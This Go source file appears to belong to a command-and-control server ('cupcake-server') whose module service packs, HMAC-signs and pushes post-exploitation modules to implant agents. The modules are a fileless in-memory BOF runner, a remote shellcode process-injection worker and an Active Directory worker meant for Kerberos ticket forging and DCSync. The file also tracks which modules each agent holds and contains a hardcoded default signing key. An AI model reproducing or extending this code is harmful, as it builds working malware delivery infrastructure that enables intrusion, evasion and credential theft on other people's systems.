package services

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/google/uuid"

	"cupcake-server/pkg/paths"
	"cupcake-server/pkg/utils"
)

// Product L2 modules (independent packages, separate push).
var productModuleIDs = map[string]bool{
	"bof":    true, // L2 classic in-process COFF runner (Manual-Map, fileless)
	"inject": true,
	"ad":     true, // L2 AD sacrificial worker (docs/AD_MODULE_DESIGN.md)
}

// modulePlatforms declares which OSes each product module supports.
// "windows" | "linux" (case-insensitive match against agent-reported os).
// If absent or empty, treated as windows-only for safety (current product reality).
var modulePlatforms = map[string][]string{
	"ad":     {"windows"},
	"inject": {"windows"},
	"bof":    {"windows"},
}

// IsModuleSupportedOnOS reports whether module id may be used on the given agent OS.
// Empty os falls back to conservative "windows-only" for product modules.
func IsModuleSupportedOnOS(id, os string) bool {
	id = sanitizeID(id)
	plats, ok := modulePlatforms[id]
	if !ok || len(plats) == 0 {
		// Unknown product module: be conservative — assume windows (current design).
		return strings.EqualFold(os, "windows")
	}
	if os == "" {
		return false
	}
	for _, p := range plats {
		if strings.EqualFold(p, os) {
			return true
		}
	}
	return false
}

var (
	// ErrModuleForbidden: non-product id
	ErrModuleForbidden = errors.New("module forbidden")
	// ErrModuleNotFound: product id but not registered on disk/memory
	ErrModuleNotFound = errors.New("module not found")
)

// IsProductModule reports whether id is a product L2 module (bof | inject | ad).
func IsProductModule(id string) bool {
	return productModuleIDs[sanitizeID(id)]
}

// NewModuleServiceForTest builds an isolated service (TempDir) — not the process singleton.
func NewModuleServiceForTest(dir string) *ModuleService {
	_ = os.MkdirAll(dir, 0o755)
	SetModuleTrustKeyDir(dir)
	return &ModuleService{
		raw:         make(map[string][]byte),
		dir:         dir,
		agentLoaded: make(map[string]map[string]bool),
	}
}

// Module package format (must match Client/core/src/module_package.rs + wire_ids)
// MAGIC | ver(u16le) | flags(u16le) | id_len(u16le) | id | pay_len(u32le) | payload | hmac32

const (
	ckmsVersion = uint16(1)
)

// ModuleCatalogEntry is UI-facing metadata for a registered module.
type ModuleCatalogEntry struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	Kind        string `json:"kind"` // host | runtime | legacy | custom
	// LoadMode: product load path — mem (Manual-Map) | worker (sacrificial EXE) | legacy (LoadLibrary)
	LoadMode string `json:"load_mode"`
	Size     int    `json:"size"`
	// LoadedOnAgent: when listing with ?uuid=, whether agent currently holds this module
	LoadedOnAgent bool `json:"loaded_on_agent,omitempty"`
	// SupportedOS: list of OS strings this module supports (e.g. ["windows"]). Empty means unknown (treated conservatively as windows-only for product modules).
	SupportedOS []string `json:"supported_os,omitempty"`
	// Capabilities: module-level feature flags for UI gating (模块能力).
	// e.g. bof → ["bof"]; ad → ["ad_ops"]; inject → ["inject"].
	Capabilities []string `json:"capabilities,omitempty"`
	// Trust / maintain metadata for warehouse UI.
	Version string `json:"version,omitempty"`
	Signer  string `json:"signer,omitempty"`
	SHA256  string `json:"sha256,omitempty"`
	Signed  bool   `json:"signed"`
}

// ModuleService packs/serves L2 modules for Stage0 agents.
type ModuleService struct {
	mu sync.RWMutex
	// moduleID -> raw PE/DLL bytes (unpacked payload)
	raw map[string][]byte
	// modules directory on disk
	dir string
	// optional shared key material; empty → default dev key
	keySeed []byte
	// agentUUID -> set of module ids believed loaded/staged on agent
	agentLoaded map[string]map[string]bool
}

var defaultModuleService *ModuleService
var moduleOnce sync.Once

// GetModuleService returns the process-wide module service.
func GetModuleService() *ModuleService {
	moduleOnce.Do(func() {
		dir := paths.Join("modules")
		_ = os.MkdirAll(dir, 0o755)
		SetModuleTrustKeyDir(dir)
		defaultModuleService = &ModuleService{
			raw:         make(map[string][]byte),
			dir:         dir,
			agentLoaded: make(map[string]map[string]bool),
		}
		defaultModuleService.scanDisk()
		// Auto-sign product modules that lack {id}.trust.json (lab / first boot).
		defaultModuleService.signProductModulesOnDisk()
	})
	return defaultModuleService
}

// DefaultModuleKey matches Rust default_module_key() for dev/unpatched agents (exactly 32 bytes).
func DefaultModuleKey() []byte {
	seed := []byte("DEV_ONLY_MODULE_KEY_V1_DO_NOT___") // 32 bytes
	k := make([]byte, 32)
	copy(k, seed)
	return k
}

// DeriveModuleKey matches Rust derive_module_key(aes_key) — domain from wire seed.
func DeriveModuleKey(aesKey []byte) []byte {
	h := sha256.New()
	h.Write(utils.GetWireIDs().ModKeyDomain)
	h.Write(aesKey)
	return h.Sum(nil)
}

// SetKeySeed sets optional AES-derived seed for packaging.
func (m *ModuleService) SetKeySeed(aesKey []byte) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(aesKey) == 0 {
		m.keySeed = nil
		return
	}
	m.keySeed = DeriveModuleKey(aesKey)
}

func (m *ModuleService) activeKey() []byte {
	if len(m.keySeed) >= 16 {
		return m.keySeed
	}
	return DefaultModuleKey()
}

// RegisterRaw stores raw module PE on disk first, then memory (atomic-ish).
// Product whitelist: bof | inject | ad.
// Non-goal: no "policy lock" — any admin may delete any product module.
func (m *ModuleService) RegisterRaw(id string, pe []byte) error {
	id = sanitizeID(id)
	if id == "" || len(pe) == 0 {
		return fmt.Errorf("invalid module id or empty payload")
	}
	if !IsProductModule(id) {
		return fmt.Errorf("%w: %s (product: bof, inject, ad)", ErrModuleForbidden, id)
	}
	_ = os.MkdirAll(m.dir, 0o755)
	final := filepath.Join(m.dir, id+".bin")
	tmp := filepath.Join(m.dir, fmt.Sprintf(".%s.%s.tmp", id, uuid.NewString()))
	if err := os.WriteFile(tmp, pe, 0o644); err != nil {
		return fmt.Errorf("write module temp: %w", err)
	}
	if err := os.Rename(tmp, final); err != nil {
		_ = os.Remove(tmp)
		return fmt.Errorf("commit module file: %w", err)
	}
	cp := make([]byte, len(pe))
	copy(cp, pe)
	m.mu.Lock()
	m.raw[id] = cp
	m.mu.Unlock()
	return nil
}

// LoadFromFile loads a PE/DLL into the registry under id.
func (m *ModuleService) LoadFromFile(id, path string) error {
	b, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	return m.RegisterRaw(id, b)
}

// Dir returns the modules storage directory.
func (m *ModuleService) Dir() string {
	return m.dir
}

// Delete removes a module from memory and disk.
// Returns ErrModuleForbidden / ErrModuleNotFound for controller mapping.
// Non-goal: no policy-lock state — admins may always delete product modules when present.
func (m *ModuleService) Delete(id string) error {
	id = sanitizeID(id)
	if id == "" {
		return fmt.Errorf("empty module id")
	}
	if !IsProductModule(id) {
		return fmt.Errorf("%w: %s", ErrModuleForbidden, id)
	}
	path := filepath.Join(m.dir, id+".bin")
	m.mu.Lock()
	_, inMem := m.raw[id]
	m.mu.Unlock()
	_, diskErr := os.Stat(path)
	onDisk := diskErr == nil
	if !inMem && !onDisk {
		// Also check alternate names as "present"
		alts := altNames(m.dir, id)
		for _, a := range alts {
			if _, e := os.Stat(a); e == nil {
				onDisk = true
				break
			}
		}
	}
	if !inMem && !onDisk {
		return fmt.Errorf("%w: %s", ErrModuleNotFound, id)
	}

	m.mu.Lock()
	delete(m.raw, id)
	for agent, set := range m.agentLoaded {
		if set != nil {
			delete(set, id)
			if len(set) == 0 {
				delete(m.agentLoaded, agent)
			}
		}
	}
	m.mu.Unlock()

	if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
		return err
	}
	for _, alt := range altNames(m.dir, id) {
		_ = os.Remove(alt)
	}
	log.Printf("[Module] deleted %s", id)
	return nil
}

func altNames(dir, id string) []string {
	alts := []string{filepath.Join(dir, "cupcake_mod_"+id+".dll")}
	switch id {
	case "bof":
		// Neutral artifact name produced by build-bof-module.ps1 (v2).
		alts = append(alts, filepath.Join(dir, "app_rt.dll"))
	case "inject":
		alts = append(alts, filepath.Join(dir, "cupcake-inject-worker.exe"))
	case "ad":
		alts = append(alts,
			filepath.Join(dir, "cupcake-ad-worker.exe"),
			filepath.Join(dir, "ad.exe"),
		)
	}
	return alts
}

// resolveRaw returns registered PE bytes for module id (memory then disk).
// Always enforces product whitelist — stray blobs on disk cannot be packed.
func (m *ModuleService) resolveRaw(id string) ([]byte, error) {
	id = sanitizeID(id)
	if !IsProductModule(id) {
		return nil, fmt.Errorf("%w: %s", ErrModuleForbidden, id)
	}
	m.mu.RLock()
	pe, ok := m.raw[id]
	m.mu.RUnlock()
	if ok && len(pe) > 0 {
		return pe, nil
	}
	path := filepath.Join(m.dir, id+".bin")
	b, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("%w: %s", ErrModuleNotFound, id)
	}
	m.mu.Lock()
	m.raw[id] = b
	m.mu.Unlock()
	return b, nil
}

// PackCKMS builds a signed CKMS blob for module id using the service key seed
// (dev/default path). Prefer PackCKMSWithKey for agent pushes.
func (m *ModuleService) PackCKMS(id string) ([]byte, error) {
	pe, err := m.resolveRaw(id)
	if err != nil {
		return nil, err
	}
	return PackModule(id, pe, m.activeKey())
}

// PackCKMSWithKey packs with an explicit 32-byte module HMAC key (already
// derive_module_key(aes) material). Avoids global SetKeySeed races across agents.
func (m *ModuleService) PackCKMSWithKey(id string, moduleHMACKey []byte) ([]byte, error) {
	if len(moduleHMACKey) < 16 {
		return nil, fmt.Errorf("module HMAC key too short")
	}
	pe, err := m.resolveRaw(id)
	if err != nil {
		return nil, err
	}
	return PackModule(id, pe, moduleHMACKey)
}

// CKMS flags (u16 LE) — keep in sync with Client module_package FLAG_*.
const (
	CKMSFlagPrefMemMap    uint16 = 1 << 0 // prefer Manual-Map on agent
	CKMSFlagRequireMemMap uint16 = 1 << 1 // refuse LoadLibrary disk fallback
)

// PackModule is the pure CKMS packer (exported for tests). Flags default 0.
func PackModule(id string, payload, key []byte) ([]byte, error) {
	return PackModuleWithFlags(id, payload, key, 0)
}

// PackModuleWithFlags packs MAGIC|ver|flags|id|payload|hmac (see Client module_package).
func PackModuleWithFlags(id string, payload, key []byte, flags uint16) ([]byte, error) {
	if id == "" || len(id) > 64 {
		return nil, fmt.Errorf("invalid module id length")
	}
	if len(key) < 16 {
		return nil, fmt.Errorf("module key too short")
	}
	idBytes := []byte(id)
	body := make([]byte, 0, 4+2+2+2+len(idBytes)+4+len(payload)+32)
	pkg := utils.GetWireIDs().PkgMagic
	body = append(body, pkg[:]...)
	ver := make([]byte, 2)
	binary.LittleEndian.PutUint16(ver, ckmsVersion)
	body = append(body, ver...)
	fl := make([]byte, 2)
	binary.LittleEndian.PutUint16(fl, flags)
	body = append(body, fl...)
	idLen := make([]byte, 2)
	binary.LittleEndian.PutUint16(idLen, uint16(len(idBytes)))
	body = append(body, idLen...)
	body = append(body, idBytes...)
	payLen := make([]byte, 4)
	binary.LittleEndian.PutUint32(payLen, uint32(len(payload)))
	body = append(body, payLen...)
	body = append(body, payload...)
	mac := hmacSHA256(key, body)
	body = append(body, mac...)
	return body, nil
}

// PackBase64 returns base64 CKMS for agent module_stage command.
func (m *ModuleService) PackBase64(id string) (string, error) {
	blob, err := m.PackCKMS(id)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(blob), nil
}

// PackBase64WithKey is PackBase64 with an explicit module HMAC key.
func (m *ModuleService) PackBase64WithKey(id string, moduleHMACKey []byte) (string, error) {
	blob, err := m.PackCKMSWithKey(id, moduleHMACKey)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(blob), nil
}

// List returns registered module ids (no OS filter — used for admin warehouse views).
func (m *ModuleService) List() []string {
	entries := m.ListCatalog("", "")
	out := make([]string, 0, len(entries))
	for _, e := range entries {
		out = append(out, e.ID)
	}
	return out
}

// ModuleDescribe returns human name/description/kind for known module ids.
func ModuleDescribe(id string) (name, desc, kind string) {
	name, desc, kind, _ = ModuleDescribeEx(id)
	return name, desc, kind
}

// ModuleDescribeEx also returns product load_mode: mem | worker | legacy.
func ModuleDescribeEx(id string) (name, desc, kind, loadMode string) {
	switch sanitizeID(id) {
	case "bof":
		return "BOF 执行器",
			"产品模块③：Agent 进程内经典 BOF（Manual-Map 无文件加载，无新进程）。BOF 载荷在插件库，本模块是执行器。",
			"runtime", "mem"
	case "inject":
		return "进程注入",
			"产品模块：L2 远程 shellcode 注入（method: nt|crt|apc|stomping|auto）。独立 sacrificial worker，与 bof 独立推送。.NET 已退役：程序集请先转 shellcode（如 Donut）再注入。",
			"runtime", "worker"
	case "ad":
		return "Active Directory",
			"产品模块：L2 域态势/Kerberos 等（独立 sacrificial worker PE；Stage0 不映射）。规格见 AD_MODULE_DESIGN。脚手架含 ping；烤票/DCSync 分阶段交付，未完成不得宣称 ad 模块完成。",
			"host", "worker"
	default:
		return id, "非产品模块（已忽略；产品仅 bof / inject / ad）。", "legacy", "mem"
	}
}

// ModuleCapabilities returns feature flags unlocked by a product L2 module (模块能力).
// Distinct from plugin weapon_run (插件能力).
func ModuleCapabilities(id string) []string {
	switch sanitizeID(id) {
	case "bof":
		return []string{"bof"}
	case "inject":
		return []string{"inject"}
	case "ad":
		return []string{"ad_ops"}
	default:
		return nil
	}
}

// ErrModuleRequired is returned when an agent lacks a required product L2 module.
// Error text always starts with "module_required: <id>" for UI/MCP parsing.
var ErrModuleRequired = errors.New("module_required")

// ModuleRequiredError builds a clear gate error for missing L2 modules.
func ModuleRequiredError(moduleID, reason string) error {
	moduleID = sanitizeID(moduleID)
	if reason == "" {
		reason = fmt.Sprintf("load product module '%s' on agent first", moduleID)
	}
	return fmt.Errorf("%w: %s (%s)", ErrModuleRequired, moduleID, reason)
}

// IsModuleRequired reports whether err is a module capability gate failure.
func IsModuleRequired(err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, ErrModuleRequired) {
		return true
	}
	return strings.Contains(err.Error(), "module_required:")
}

// ModuleRequiredID extracts the module id from a module_required error (best-effort).
func ModuleRequiredID(err error) string {
	if err == nil {
		return ""
	}
	msg := err.Error()
	idx := strings.Index(msg, "module_required:")
	if idx < 0 {
		return ""
	}
	rest := strings.TrimSpace(msg[idx+len("module_required:"):])
	for i, c := range rest {
		if c == ' ' || c == '(' || c == '\n' || c == '\r' || c == ',' {
			return sanitizeID(rest[:i])
		}
	}
	return sanitizeID(rest)
}

// ListCatalog returns modules with descriptions; if agentUUID set, fills LoadedOnAgent.
// The agentOS (from agent SystemInfo, e.g. "windows" or "linux") is used to filter platform support.
// Empty agentOS is treated conservatively (only modules that claim "multi" or empty would pass, which for our set means none).
func (m *ModuleService) ListCatalog(agentUUID, agentOS string) []ModuleCatalogEntry {
	m.mu.RLock()
	defer m.mu.RUnlock()
	seen := make(map[string]bool)
	var out []ModuleCatalogEntry
	add := func(id string, size int) {
		id = sanitizeID(id)
		if id == "" || seen[id] || !IsProductModule(id) {
			return
		}
		// Warehouse view (agentOS empty) lists all product modules; agent-scoped
		// views filter by supported OS (empty os → conservative refuse, see push gate).
		if agentOS != "" && !IsModuleSupportedOnOS(id, agentOS) {
			return
		}
		seen[id] = true
		name, desc, kind, loadMode := ModuleDescribeEx(id)
		supported := modulePlatforms[id]
		if supported == nil {
			supported = []string{}
		}
		caps := ModuleCapabilities(id)
		e := ModuleCatalogEntry{
			ID:           id,
			Name:         name,
			Description:  desc,
			Kind:         kind,
			LoadMode:     loadMode,
			Size:         size,
			SupportedOS:  append([]string(nil), supported...),
			Capabilities: append([]string(nil), caps...),
		}
		EnsureModuleTrustFromDisk(m.dir, id)
		if meta, ok := getModuleTrust(id); ok {
			e.Version = meta.Version
			e.Signer = meta.Signer
			e.SHA256 = meta.SHA256
			e.Signed = strings.TrimSpace(meta.Signature) != ""
		}
		if agentUUID != "" {
			if set := m.agentLoaded[agentUUID]; set != nil && set[id] {
				e.LoadedOnAgent = true
			}
		}
		out = append(out, e)
	}
	for id, pe := range m.raw {
		add(id, len(pe))
	}
	entries, _ := os.ReadDir(m.dir)
	for _, ent := range entries {
		if ent.IsDir() {
			continue
		}
		name := ent.Name()
		if strings.HasSuffix(name, ".bin") {
			id := strings.TrimSuffix(name, ".bin")
			sz := 0
			if info, err := ent.Info(); err == nil {
				sz = int(info.Size())
			}
			if pe, ok := m.raw[id]; ok {
				sz = len(pe)
			}
			add(id, sz)
		}
	}
	return out
}

// MarkAgentModule records that module id is staged/loaded on agent.
func (m *ModuleService) MarkAgentModule(agentUUID, moduleID string) {
	if agentUUID == "" || moduleID == "" {
		return
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.agentLoaded == nil {
		m.agentLoaded = make(map[string]map[string]bool)
	}
	if m.agentLoaded[agentUUID] == nil {
		m.agentLoaded[agentUUID] = make(map[string]bool)
	}
	m.agentLoaded[agentUUID][sanitizeID(moduleID)] = true
}

// ClearAgentModule records unload / burn.
func (m *ModuleService) ClearAgentModule(agentUUID, moduleID string) {
	if agentUUID == "" {
		return
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	if set := m.agentLoaded[agentUUID]; set != nil {
		delete(set, sanitizeID(moduleID))
	}
}

// AgentHasModule reports whether we believe module is still on agent.
func (m *ModuleService) AgentHasModule(agentUUID, moduleID string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	set := m.agentLoaded[agentUUID]
	return set != nil && set[sanitizeID(moduleID)]
}

// SetAgentModules replaces loaded set from agent module_list (comma-separated).
// Agent list_loaded returns "id:mode" entries (e.g. "bof:mem,inject:worker");
// strip the mode suffix so AgentHasModule("bof") keeps working after query.
func (m *ModuleService) SetAgentModules(agentUUID, listCSV string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.agentLoaded == nil {
		m.agentLoaded = make(map[string]map[string]bool)
	}
	set := make(map[string]bool)
	for _, p := range strings.Split(listCSV, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		// "bof:mem" / "inject:worker" → id only
		if i := strings.IndexByte(p, ':'); i > 0 {
			p = p[:i]
		}
		p = strings.TrimSpace(p)
		if p != "" {
			set[sanitizeID(p)] = true
		}
	}
	m.agentLoaded[agentUUID] = set
}

// BuildModuleStageCommand builds a CommandPayload-compatible map for pushing a module.
func (m *ModuleService) BuildModuleStageCommand(id, reqID string) (map[string]interface{}, error) {
	b64, err := m.PackBase64(id)
	if err != nil {
		return nil, err
	}
	return map[string]interface{}{
		"command_type":    "module_stage",
		"command_content": id,
		"path":            id,
		"data":            b64,
		"req_id":          reqID,
	}, nil
}

func (m *ModuleService) scanDisk() {
	entries, err := os.ReadDir(m.dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".bin") {
			continue
		}
		id := sanitizeID(strings.TrimSuffix(e.Name(), ".bin"))
		if !IsProductModule(id) {
			log.Printf("[Module] skip non-product blob on disk: %s (not in whitelist)", e.Name())
			continue
		}
		b, err := os.ReadFile(filepath.Join(m.dir, e.Name()))
		if err != nil {
			continue
		}
		m.raw[id] = b
	}
	// Well-known product module filenames
	for _, pair := range []struct{ id, name string }{
		{"bof", "app_rt.dll"},
		{"bof", "cupcake_mod_bof.dll"},
		{"inject", "cupcake-inject-worker.exe"},
		{"ad", "cupcake-ad-worker.exe"},
		{"ad", "ad.exe"},
	} {
		if !IsProductModule(pair.id) {
			continue
		}
		if _, ok := m.raw[pair.id]; ok {
			continue
		}
		p := filepath.Join(m.dir, pair.name)
		if b, err := os.ReadFile(p); err == nil && len(b) > 0 {
			m.raw[pair.id] = b
		}
	}
	// Drop non-product ids left on disk from older builds (do not delete files here)
	for id := range m.raw {
		if !IsProductModule(id) {
			delete(m.raw, id)
		}
	}
}

// TryLoadDefaultRuntime ensures module id is registered from storage/modules/{id}.bin
func (m *ModuleService) TryLoadDefaultRuntime(id string) error {
	id = sanitizeID(id)
	m.mu.RLock()
	_, ok := m.raw[id]
	m.mu.RUnlock()
	if ok {
		return nil
	}
	candidates := append([]string{filepath.Join(m.dir, id+".bin")}, altNames(m.dir, id)...)
	for _, p := range candidates {
		if err := m.LoadFromFile(id, p); err == nil {
			return nil
		}
	}
	return fmt.Errorf("runtime module %q not in storage/modules (build the artifact and copy it as %s.bin)", id, id)
}

func sanitizeID(id string) string {
	id = filepath.Base(id)
	id = strings.ReplaceAll(id, "..", "")
	return id
}

// hmacSHA256 RFC2104 (matches Rust module_package::hmac_sha256)
func hmacSHA256(key, data []byte) []byte {
	var k [64]byte
	if len(key) > 64 {
		sum := sha256.Sum256(key)
		copy(k[:], sum[:])
	} else {
		copy(k[:], key)
	}
	var ipad, opad [64]byte
	for i := 0; i < 64; i++ {
		ipad[i] = 0x36 ^ k[i]
		opad[i] = 0x5c ^ k[i]
	}
	inner := sha256.New()
	inner.Write(ipad[:])
	inner.Write(data)
	innerSum := inner.Sum(nil)
	outer := sha256.New()
	outer.Write(opad[:])
	outer.Write(innerSum)
	return outer.Sum(nil)
}
